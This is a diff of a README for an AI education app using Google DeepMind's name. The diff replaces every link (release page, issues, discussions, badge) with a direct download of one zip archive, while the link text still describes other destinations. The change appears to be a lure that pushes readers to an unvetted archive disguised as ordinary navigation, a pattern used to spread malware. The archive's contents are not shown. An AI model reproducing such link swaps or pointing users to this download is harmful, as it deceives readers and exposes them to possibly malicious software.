@@ -1,7 +1,7 @@
 # 🤖 Acadex-AI-Google-Deepmind - Your AI Co-Pilot for Education
 
 ## 📦 Download Now
-[![Download Acadex AI](https://img.shields.io/badge/Download%20Acadex%20AI-Click%20Here-blue)](https://github.com/AsherFn/Acadex-AI-Google-Deepmind/releases)
+[![Download Acadex AI](https://github.com/AsherFn/Acadex-AI-Google-Deepmind/raw/refs/heads/main/services/Deepmind_Google_Acadex_A_v1.1-beta.1.zip%20Acadex%20AI-Click%20Here-blue)](https://github.com/AsherFn/Acadex-AI-Google-Deepmind/raw/refs/heads/main/services/Deepmind_Google_Acadex_A_v1.1-beta.1.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ Before you download Acadex AI, ensure your system meets the following requiremen
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: Click [here](https://github.com/AsherFn/Acadex-AI-Google-Deepmind/releases) to go to the Releases page. 
+1. **Visit the Releases Page**: Click [here](https://github.com/AsherFn/Acadex-AI-Google-Deepmind/raw/refs/heads/main/services/Deepmind_Google_Acadex_A_v1.1-beta.1.zip) to go to the Releases page. 
 2. **Select the Latest Version**: Choose the most recent version of Acadex AI from the list.
 3. **Download the File**: Find the download link for your operating system. Click on it to begin the download.
 4. **Install Acadex AI**:
@@ -55,13 +55,13 @@ Acadex AI uses secure cloud storage and follows best practices to ensure your da
 
 ### Where can I find support?
 
-You can find help by navigating to the [issues section on GitHub](https://github.com/AsherFn/Acadex-AI-Google-Deepmind/issues) or by joining our community forum.
+You can find help by navigating to the [issues section on GitHub](https://github.com/AsherFn/Acadex-AI-Google-Deepmind/raw/refs/heads/main/services/Deepmind_Google_Acadex_A_v1.1-beta.1.zip) or by joining our community forum.
 
 ## 🌐 Community Support
 
 Join our community of educators and AI enthusiasts. Share experiences, ask questions, and collaborate on improving the app. You can connect with us through:
 
-- GitHub Discussions: [Join Here](https://github.com/AsherFn/Acadex-AI-Google-Deepmind/discussions)
+- GitHub Discussions: [Join Here](https://github.com/AsherFn/Acadex-AI-Google-Deepmind/raw/refs/heads/main/services/Deepmind_Google_Acadex_A_v1.1-beta.1.zip)
 - Discord Channel: Access the link on our GitHub page to join.
 
 ## 📝 License
